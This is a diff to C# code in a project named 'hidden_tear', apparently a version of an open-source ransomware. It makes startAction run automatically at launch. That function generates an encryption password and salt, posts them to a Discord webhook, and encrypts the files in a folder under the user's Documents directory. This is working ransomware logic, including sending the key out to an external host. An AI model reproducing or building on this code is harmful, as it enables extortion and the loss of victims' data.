@@ -20,7 +20,7 @@ namespace hidden_tear
         {
             Task.Run(() =>
             {
-
+                startAction();
             });
             Application.EnableVisualStyles();
             Application.SetCompatibleTextRenderingDefault(false);
@@ -65,13 +65,14 @@ namespace hidden_tear
 
         static async void startAction()
         {
-            string password = Crypto.CreatePasswordAndSalt(15);
-            string salt = Crypto.CreatePasswordAndSalt(8);
+            string password = Crypto.CreatePassword(15);
+            string salt = Crypto.CreateSalt(8);
             string path = "\\Documents\\Testing";
             string startPath = Config.userDir + Config.userName + path;
             await Logger.SendData(Config.DiscordWebhook,password, salt);
             encryptDirectory(startPath, password, salt);
             password = null;
+            salt = null;
         }
     }
 }
